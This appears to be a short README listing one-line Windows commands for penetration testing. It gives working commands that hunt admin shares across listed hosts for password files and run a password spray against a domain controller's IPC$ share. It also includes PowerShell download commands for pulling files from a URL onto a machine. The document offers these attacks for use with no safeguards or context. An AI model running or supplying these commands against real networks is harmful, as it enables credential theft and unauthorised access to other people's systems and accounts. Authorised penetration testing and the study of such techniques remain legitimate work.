# oneliners
One line DOS commands useful during pentests

for /f %a in (hosts.txt) do dir /b /s \\%a\C$\Users\*password*

for /f %a in (hosts.txt) do @if exist \\%a\C$\Users\ echo users found on %a

password spray
@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL 

invoke-webrequest -uri url -outfile filename
(New-Object System.Net.WebClient).DownloadFile("url","output")





